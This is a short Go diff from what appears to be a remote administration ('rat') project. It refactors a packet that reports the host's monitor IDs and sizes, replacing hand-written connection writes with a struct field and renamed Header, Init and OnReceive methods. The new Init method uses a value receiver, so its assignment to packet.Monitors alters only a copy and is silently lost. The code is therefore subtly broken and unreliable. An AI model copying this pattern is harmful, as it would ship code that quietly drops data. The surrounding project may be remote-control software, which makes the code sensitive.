@@ -5,27 +5,21 @@ import (
 	"rat/common"
 )
 
-type MonitorsPacket Packet
+type MonitorsPacket struct {
+	Monitors []screen.Monitor
+}
 
-func (packet MonitorsPacket) GetHeader() common.PacketHeader {
+func (packet MonitorsPacket) Header() common.PacketHeader {
 	return common.MonitorsHeader
 }
 
-func (packet MonitorsPacket) Write(c *Connection) error {
+func (packet MonitorsPacket) Init() {
 	screen.QueryMonitors()
 
-	c.WriteInt(len(screen.Monitors))
-
-	for _, monitor := range screen.Monitors {
-		c.WriteInt(monitor.ID)
-		c.WriteInt(monitor.Width)
-		c.WriteInt(monitor.Height)
-	}
-
-	return nil
+	packet.Monitors = screen.Monitors
 }
 
-func (packet MonitorsPacket) Read(c *Connection) error {
+func (packet MonitorsPacket) OnReceive() error {
 	Queue <- MonitorsPacket{}
 	return nil
 }
